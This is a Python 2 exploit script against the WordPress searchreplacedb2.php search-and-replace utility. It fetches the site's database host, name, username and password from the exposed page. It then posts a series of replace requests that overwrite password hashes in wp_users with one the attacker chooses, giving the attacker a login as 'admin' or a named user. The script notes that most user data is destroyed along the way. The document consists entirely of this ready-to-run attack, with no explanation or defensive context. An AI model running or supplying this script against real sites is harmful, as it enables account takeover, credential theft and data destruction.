#!/usr/bin/env python2
import urllib,urllib2
import optparse,sys
import time
import hashlib

class Target(object):
	"""The target to overwrite"""
	def __init__(self, url, user,password):
		self.ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ./"
		self.ALPHABET = list(self.ALPHABET)
		self.ALPHABET.append("$1$")
		self.ALPHABET.append("10")
		self.url = self.sanitizeUrl(url)
		self.user = user
		self.password = password
		self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()


	def replace(self,search,replace):
		values = {'host':self.db_host,
		'data':self.db_name,
		'user':self.db_user,
		'pass':self.db_pass,
		'char':self.db_char,
		'guid':0,
		'tables\x5B0\x5D':'wp_users'}

		values['srch'] = search
		values['rplc'] = replace

		data = urllib.urlencode(values)
		response = urllib2.urlopen(self.url+"?step=5",data)
		html = response.read()
		time.sleep(.050)

	def attack_sequence(self):
		Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
		try:
			time.sleep(10)
		except:
			Target.bad("\nUser stopped attack. Leaving...")
			exit(0)
		self.keep_user()
		self.attack_password()
		self.place_user()

	def attack_password(self):
		Target.good("Spraying wp-tables")
		for x in range(0,len(self.ALPHABET)):
			if x == len(self.ALPHABET)/4:
				Target.good("25% done")
			elif x == len(self.ALPHABET)/2:
				Target.good("50% done")
			elif x == len(self.ALPHABET)/4*3:
				Target.good("75% done")
			self.replace(self.ALPHABET[x],'1')
		Target.good("Placing '"+self.password+"' as password")
		for x in reversed(range(15,35)):
			self.replace('1'*x,self.PASSWORD_HASH)

	def keep_user(self):
		Target.good("Saving user '"+self.user+"'")
		self.replace(self.user,"$$$")

	def place_user(self):
		Target.good("Reverting username to '"+self.user+"'")
		self.replace("$$$",self.user)

	def populate(self):
		Target.good("Getting info at "+self.url)
		values = {'loadwp':1}
		data = urllib.urlencode(values)
		response = ""
		try:
			response = urllib2.urlopen(self.url+"?step=2",data)
		except:
			Target.bad("Request error while trying to populate")
			exit(1)
		html = response.read()
		html = html.split('\n')
		for line in html:
			if line.find('name="host"') != -1:
				self.db_host = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_host+"\x1B[0m' as database host")
			if line.find('name="data"') != -1:
				self.db_name = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_name+"\x1B[0m' as database name")
			if line.find('name="user"') != -1:
				self.db_user = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_user+"\x1B[0m' as database user")
			if line.find('name="pass"') != -1:
				self.db_pass = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_pass+"\x1B[0m' as database password")
			if line.find('name="char"') != -1:
				self.db_char = line.split('"')[9]
				Target.good("Setting '\x1B[35m"+self.db_char+"\x1B[0m' as charset")

	def sanitizeUrl(self,url):
		if "://" not in url: 
			url = "http://"+url
		if "searchreplacedb2.php" not in url:
			if url[len(url)-1] != "/":
				url = url+"/"
			url += "searchreplacedb2.php"
		return url

	@staticmethod
	def good(text):
		print "[\x1B[32m+\x1B[0m] "+text
	
	@staticmethod
	def bad(text):
		print "[\x1B[31m-\x1B[0m] "+text
	
	@staticmethod
	def info(text):
		print "[\x1B[33m!\x1B[0m] "+text

def main():
	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> [-u <user>] [-p <password>]\n\n~Mixbo (https://github.com/mixbo)")
	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
	parser.add_option('-u',dest='target_user',type='string',help="The target's user you'll use")
	parser.add_option('-p',dest='target_password',type='string',help="The new password")
	(options, args) = parser.parse_args()

	if not options.target_url:
		print parser.usage
		exit(1)
	else:
		url = options.target_url

	Target.good("Creating a login pair for \x1B[32m"+url+"\x1B[0m")
	
	if options.target_user:
		user = options.target_user
	else:
		Target.info("Using 'admin' because no user was provided")
		user = "admin"

	if options.target_password:
		password = options.target_password
	else:
		Target.info("Using 'password' because no password was provided")
		password = "password"

	t = Target(url,user,password)
	t.populate()
	t.attack_sequence()
	Target.good("You should be able to login using \x1B[32m"+t.user+":"+t.password+"\x1B[0m")

if __name__ == "__main__":
	main()
